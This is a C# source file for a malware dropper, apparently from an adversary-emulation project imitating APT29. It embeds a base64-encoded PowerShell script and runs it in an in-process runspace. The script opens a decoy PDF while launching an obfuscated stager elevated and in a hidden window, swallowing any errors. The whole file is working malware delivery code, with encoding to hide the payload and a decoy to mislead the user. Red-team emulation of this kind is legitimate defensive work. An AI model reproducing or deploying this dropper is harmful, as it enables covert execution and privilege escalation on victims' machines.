using System;
using System.IO;
using System.Resources;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;

//Adding libraries for powershell stuff
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace APT29_2ed_Dropper
{
    class Program
    {
        static string RunPS(string cmd)
        {
            //Init stuff
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            //Add commands
            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString().Trim();
        }

        static void Main(string[] args)
        {
            // runner.ps1
            string b64runner = "U3RhcnQtUHJvY2VzcyAuXHZlcnNpb24ucGRmCnRyeSB7IFN0YXJ0LVByb2Nlc3MgInBvd2Vyc2hlbGwiIC1Bcmd1bWVudExpc3QgIi1GaWxlICRwd2Rcb2JmdXNjYXRlZF9zdGFnZXIucHMxIiAtVmVyYiBydW5BcyAtV2luZG93U3R5bGUgaGlkZGVuIH0gY2F0Y2h7fQo=";
            string runner = Encoding.UTF8.GetString(Convert.FromBase64String(b64runner));
            RunPS(runner);
        }
    }
}
